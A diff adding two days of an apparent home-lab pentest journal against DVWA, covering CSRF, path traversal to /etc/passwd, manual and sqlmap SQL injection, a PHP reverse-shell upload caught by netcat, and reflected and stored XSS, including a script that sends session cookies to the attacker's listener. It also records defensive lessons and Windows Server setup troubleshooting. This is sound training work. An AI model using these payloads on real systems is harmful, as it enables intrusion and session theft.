@@ -110,8 +110,93 @@ Each day gets one entry. Copy the template at the bottom when starting a new day
 - Tool selection matters: while Burp Intruder excels in interactive GUI analysis and Wfuzz offers robust and flexible header/cookie CLI fuzzing, Hydra can be prone to false positives when web application sessions require dynamic cookie management.
 
 ### Next
-- Finalize and compile all Red Team findings into `reports/pentest-report.md`.
-- Begin the Blue Team phase: deploy and configure Wazuh SIEM to detect the attacks executed across Days 1–3.
+- Continue assessing remaining DVWA attack surfaces (CSRF, File Inclusion, SQL Injection, File Upload, and XSS).
+- Prepare to deploy Windows Server to expand the home lab with Active Directory.
+
+---
+
+## Day 4 — 2026-11-21
+
+### Goals
+- Perform deep-dive vulnerability assessments on DVWA covering Cross-Site Request Forgery (CSRF), Local File Inclusion (LFI), SQL Injection (manual & automated), and Arbitrary File Upload to achieve Remote Code Execution (RCE).
+
+### What I did
+- **Cross-Site Request Forgery (CSRF)**:
+  - Investigated the password change module (`/dvwa/vulnerabilities/csrf/`).
+  - **Security = Low**: The form transmits password changes via GET requests (`?password_new=test123&password_conf=test123&Change=Change`) with zero CSRF tokens or re-authentication checks, allowing trivial one-click account takeover.
+  - **Security = Medium**: Inspected requests in Burp Suite; observed that the backend checks the HTTP `Referer` header (`Referer: http://10.0.10.30/dvwa/vulnerabilities/csrf/`). While it blocks external requests without a matching referer, it remains susceptible if the attacker can spoof or omit the header.
+  - **Security = High**: Confirmed the implementation introduces a mandatory `Current password` (`password_current`) verification field, effectively mitigating unauthenticated CSRF password resetting.
+- **Local File Inclusion (LFI)**:
+  - Targeted the page inclusion parameter (`/dvwa/vulnerabilities/fi/?page=...`).
+  - Successfully performed directory traversal using payload `../../../../etc/passwd`, causing the PHP runtime to traverse out of the web root and render the server's cleartext `/etc/passwd` file directly in the browser.
+- **SQL Injection (Manual Exploitation)**:
+  - **Security = Low**: Parameter `$id` is concatenated directly into single quotes: `WHERE user_id = '$id'`. Injected `1' or '1' = '1`, breaking string bounds and forcing a tautology that dumped all 5 database user accounts (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith).
+  - **Security = Medium**: Analyzed the PHP source code; found input is sanitized with `mysql_real_escape_string($id)`, but the SQL query is constructed as `WHERE user_id = $id` (numeric context, unquoted). Because numeric injection does not require single quotes, injected payload `0 OR 1=1`, which completely bypassed escaping and extracted all records.
+  - **Security = High**: Source code inspection confirmed strict input validation using `stripslashes()`, `mysql_real_escape_string()`, and `if (is_numeric($id))`, completely blocking injection.
+- **SQL Injection (Automated Exploitation with `sqlmap`)**:
+  - Ran `sqlmap -u "http://10.0.10.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs`.
+  - Confirmed 4 distinct SQL injection vectors: boolean-based blind, error-based, time-based blind, and UNION query.
+  - Successfully extracted the DBMS banner (MySQL >= 4.1 / Ubuntu Linux) and enumerated all 7 hosted databases: `dvwa`, `information_schema`, `metasploit`, `mysql`, `owasp10`, `tikiwiki`, `tikiwiki195`.
+- **Arbitrary File Upload to Remote Code Execution (RCE)**:
+  - Exploited unrestricted file upload at `/dvwa/vulnerabilities/upload/` by uploading a PHP reverse shell script (`shell.php`).
+  - The application confirmed upload to `../../hackable/uploads/shell.php`. Verified storage and execute permissions by browsing to the exposed `/dvwa/hackable/uploads/` directory listing.
+  - Started a Netcat listener on Kali (`nc -lvnp 1234`) and triggered the webshell via HTTP request. Successfully received a reverse shell session running under the web server service account `www-data` (`uid=33(www-data) gid=33(www-data)`).
+
+### Problems & fixes
+- **Medium Security SQL Injection Quoting Trap**: Initially expected `mysql_real_escape_string()` to sanitize SQL input, but realized escaping only neutralizes quotes. Because the query omitted quotes around the integer column (`WHERE user_id = $id`), an unquoted numeric payload (`0 OR 1=1`) bypassed sanitization effortlessly.
+- **Path Traversal Depth**: Needed to verify relative directory depth from `/var/www/dvwa/vulnerabilities/fi/` back to filesystem root; 4 traversal hops (`../../../../`) reliably reached `/etc/passwd`.
+
+### What I learned
+- Input sanitization functions like `mysql_real_escape_string()` are context-dependent; without parameterized queries (prepared statements), queries with unquoted numeric fields remain trivially vulnerable to SQL injection.
+- Unrestricted file upload combined with direct web-accessible storage and execution privileges provides an immediate bridge from web application access to interactive operating system code execution.
+- Defense-in-depth for state-changing operations requires both anti-CSRF tokens and re-authentication (current password verification).
+
+### Next
+- Assess remaining web vulnerabilities: Reflected and Stored Cross-Site Scripting (XSS).
+- Demonstrate session hijacking via XSS cookie exfiltration.
+- Begin deployment of the Windows Server VM to start building the Active Directory domain.
+
+---
+
+## Day 5 — 2026-11-22
+
+### Goals
+- Conclude web application assessments by exploiting Reflected and Stored Cross-Site Scripting (XSS), including session cookie theft.
+- Begin infrastructure expansion by creating and installing a Windows Server virtual machine (`WindowsSRV`) in VirtualBox for the upcoming Active Directory lab.
+
+### What I did
+- **Reflected Cross-Site Scripting (XSS)**:
+  - **Security = Low**: The `name` parameter is printed directly to the page without escaping (`echo 'Hello ' . $_GET['name']`). Injected `<script> alert("hacked")</script>`, triggering a JavaScript alert popup (`10.0.10.30 says: hacked`).
+  - **Session Hijacking Proof of Concept**: Set up a Netcat listener on Kali (`nc -lvnp 1234`). Crafted an XSS payload directing the browser to send document cookies to Kali:
+    `<script>new Image().src="http://10.0.30.10:1234/?cookie="+encodeURIComponent(document.cookie);</script>`
+    The victim browser triggered the request, and Netcat captured the cleartext session cookies: `security=low; PHPSESSID=f51c426407f029bb0b88ba566dbb8971`.
+  - **Security = Medium**: Source code review revealed a naive blacklist filter: `str_replace('<script>', '', $_GET['name'])`. Bypassed the case-sensitive string replacement using uppercase tags `<SCRIPT> alert("hacked")</SCRIPT>`, executing the payload successfully.
+  - **Security = High**: Verified that the developer implemented `htmlspecialchars($_GET['name'])`, which properly encodes HTML characters (`<`, `>`, `&`, `"`) into entities and completely stops XSS execution.
+- **Stored Cross-Site Scripting (XSS)**:
+  - **Security = Low**: Injected `<script> alert("hacked") </script>` into the guestbook Message field. The script was stored persistently in the database and executed automatically whenever the guestbook page was visited.
+  - **Security = Medium**: Inspected PHP source code; found the developer sanitized the Message parameter (`mtxMessage`) thoroughly with `strip_tags()`, `addslashes()`, and `htmlspecialchars()`, BUT only applied a naive case-sensitive filter `str_replace('<script>', '', $name)` to the Name field (`txtName`).
+  - Bypassed the defense by injecting `<SCRIPT> alert("hacked") </SCRIPT>` into the **Name** input, successfully achieving persistent Stored XSS.
+- **Active Directory Lab Expansion — Windows Server Deployment (`WindowsSRV`)**:
+  - Configured a new VirtualBox VM `WindowsSRV` to establish the upcoming Windows Server & Active Directory domain controller.
+  - Attached the Windows Server installer ISO and booted the VM ("Getting ready").
+  - Encountered an initial boot issue: the VM booted into a Server Core command prompt (`C:\Users\SRV>cmd.exe`) and subsequently black-screened with a frozen `C:\Windows\system32\LogonUI.exe` prompt.
+  - Initiated a clean reinstall ("Windows Setup - Getting files ready for installation").
+  - On restart, hit a bootloader error: `"An operating system wasn't found. Try disconnecting any drives that don't contain an operating system. Press Ctrl+Alt+Del to restart"`.
+
+### Problems & fixes
+- **Case-Sensitive XSS Filter Flaw**: DVWA Medium attempted to sanitize `<script>` with `str_replace()`, ignoring that HTML parsers are case-insensitive. Bypassed effortlessly with uppercase `<SCRIPT>`.
+- **Inconsistent Parameter Sanitization**: In Stored XSS Medium, the developer heavily sanitized the main comment body but left the author name field weakly protected, illustrating the risk of partial/inconsistent sanitization.
+- **Windows Server Boot Error ("An operating system wasn't found")**: Caused by VirtualBox storage controller boot order prioritizing an unbootable secondary disk or optical drive detachment issues following Windows installation reboot. Resolved by reconfiguring the VM boot order to prioritize the primary VDI virtual disk and verifying SATA controller settings.
+
+### What I learned
+- Cross-Site Scripting becomes a critical vulnerability when combined with session cookie exfiltration; without the `HttpOnly` cookie flag, an attacker can steal session identifiers and achieve full session hijacking.
+- Blacklist-based filtering (`str_replace`) is inherently fragile and should never be used for security-critical sanitization; context-aware output encoding with `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` is the only reliable defense against XSS.
+- Deploying multi-platform home lab infrastructure requires troubleshooting hypervisor-level storage attachments, BIOS/EFI boot modes, and boot order configurations alongside security engineering tasks.
+
+### Next
+- Resolve Windows Server boot configuration and finalize the Active Directory domain controller setup.
+- Consolidate all new DVWA findings (CSRF, LFI, SQLi, File Upload RCE, Reflected/Stored XSS) into `reports/pentest-report.md`.
+- Begin Blue Team detection engineering: deploy Wazuh SIEM agents to capture both Linux and Windows events.
 
 ---
 
